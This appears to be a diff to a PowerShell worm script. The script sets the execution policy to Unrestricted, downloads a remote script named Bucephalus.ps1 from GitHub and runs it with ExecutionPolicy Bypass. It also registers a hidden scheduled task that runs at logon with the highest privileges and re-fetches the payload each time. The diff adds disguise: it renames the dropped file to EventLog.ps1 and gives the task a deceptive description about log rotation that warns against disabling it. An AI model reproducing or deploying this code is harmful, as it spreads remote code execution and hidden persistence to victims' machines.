@@ -98,7 +98,7 @@ function wormy{
                     Invoke-Command -ScriptBlock {
                     set-executionpolicy Unrestricted
                     $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
+                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
                     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass
                     }
                 }
@@ -106,7 +106,7 @@ function wormy{
             else{
                     set-executionpolicy Unrestricted
                     $WebClient = New-Object System.Net.WebClient
-                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\worm.ps1")
+                    $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1","C:\Windows\EventLog.ps1")
                     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command 'C:\Windows\worm.ps1' -ExecutionPolicy Bypass   
             }
             }
@@ -129,10 +129,12 @@ start-job -ScriptBlock {
     while(1 -eq 1){
         try{
             $action = @()
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\worm.ps1'
-            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\worm.ps1"'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
+            $action += new-scheduledtaskaction -execute 'Notepad.exe'
+            $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\EventLog.ps1"'
+            
             $trigger = New-ScheduledTaskTrigger -AtLogon
-            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -Description "Daily rotation of event logs" -RunLevel Highest -TaskPath \Microsoft\Windows\SpacePort
+            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "EventLog Rotate" -RunLevel Highest -Description "Prevents a event log cache overflow by rotating logs within NTFS filesystems. Disabling can cause system instability and is not recomended." -TaskPath \Microsoft\Windows\SpacePort
         
         }
         catch{
